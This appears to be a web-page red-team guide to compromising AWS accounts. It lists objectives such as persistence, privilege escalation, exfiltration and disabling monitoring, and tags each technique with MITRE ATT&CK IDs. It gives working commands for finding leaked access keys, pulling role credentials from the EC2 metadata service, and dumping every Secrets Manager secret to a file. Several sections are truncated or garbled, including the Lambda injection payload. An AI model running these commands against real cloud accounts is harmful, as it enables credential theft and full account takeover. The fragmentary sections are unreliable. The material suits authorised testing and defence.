AWS Cloud Red Team Operations

Comprehensive adversarial guide covering all phases from initial access to full account compromise across 11 AWS services

🗺️ Attack Surface Overview
AWS environments expose a massive distributed attack surface spanning identity (IAM/SSO), compute (EC2, Lambda, ECS/EKS), storage (S3, EBS), databases (RDS), networking (VPC), secrets management, and logging/monitoring services. A single misconfiguration can chain into full account compromise.

Primary Objectives

  • Persistent access to AWS account
  • Escalate to AdministratorAccess
  • Exfiltrate secrets, DBs, source code
  • Cross-account compromise
  • Disable detection and monitoring

Key Attack Tools

  • Pacu — AWS exploitation framework
  • PMapper — Priv-esc graph analysis
  • ScoutSuite — Multi-cloud auditor
  • Cloudsplaining — IAM deep analysis
  • Prowler — CIS benchmark scanner
  • CloudMapper — Network visualization

🚪 Initial Access

Obtaining the first foothold into an AWS environment

1. IAM Access Key Leakage
CRITICALT1552.001
Access keys committed to GitHub, baked into Docker images, exposed in CI/CD logs, or hardcoded in source code. The most common initial access vector — keys persist until explicitly rotated.
🔍 Discovery & Exploitation ▼

trufflehog git https://github.com/target/repo --only-verified
gitleaks detect --source=/path/to/repo -v

# GitHub dork

# Validate found key
aws sts get-caller-identity   --access-key-id AKIAIOSFODNN7EXAMPLE   --secret-access-key wJalrXUtnFEMI/K7MDENG

# Enumerate permissions
USER=$(aws iam get-user --query "User.UserName" -o text)
aws iam list-attached-user-policies --user-name $USER
aws iam list-user-policies --user-name $USER

1. Lambda Code Injection
CRITICALT1648
Create or hijack Lambda functions with powerful IAM roles. UpdateFunctionCode alone (no PassRole) is enough to inject into existing functions.
🆕 Create Function with Admin Role ▼

EOF
cd /tmp && zip payload.zip pwn.py

🔑 Credential Access

Stealing AWS credentials, secrets, tokens and keys from the environment

1. EC2 Instance Metadata Service (IMDS)
CRITICALT1552.005
The IMDS at 169.254.169.254 provides temporary IAM role credentials to any process running on an EC2 instance. No authentication required.
📋 Full IMDS Enumeration ▼
# Get role name
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Get user data (often contains secrets)
curl -s http://169.254.169.254/latest/user-data

# Full metadata tree
curl -s http://169.254.169.254/latest/meta-data/
# hostname, placement/, network/, tags/instance/
2. Secrets Manager Bulk Extraction
CRITICALT1555
With secretsmanager:GetSecretValue, dump every secret in the account. Commonly holds DB passwords, API keys, OAuth tokens, TLS certs, SSH keys, payment credentials.
📤 Mass Extraction ▼
aws secretsmanager list-secrets   --query "SecretList[*].Name" -o text |   tr '	' '
' | while read s; do
    echo "===== $s ====="
    aws secretsmanager get-secret-value       --secret-id "$s" --query SecretString -o text 2>/dev/null
    echo ""
  done > /tmp/all-secrets.txt
3. SSM Parameter Store Dump
HIGHT1552.001

# Target specific paths
for path in /prod /staging /database /secrets; do

1. Cross-Account Role Assumption Chain
CRITICALT1550.001
Chain role assumptions across Dev to Staging to Prod. Permissive trust policies (missing ExternalId, wildcard Principal) allow full lateral movement across the organization.

# Step 1: Assume role in staging from dev
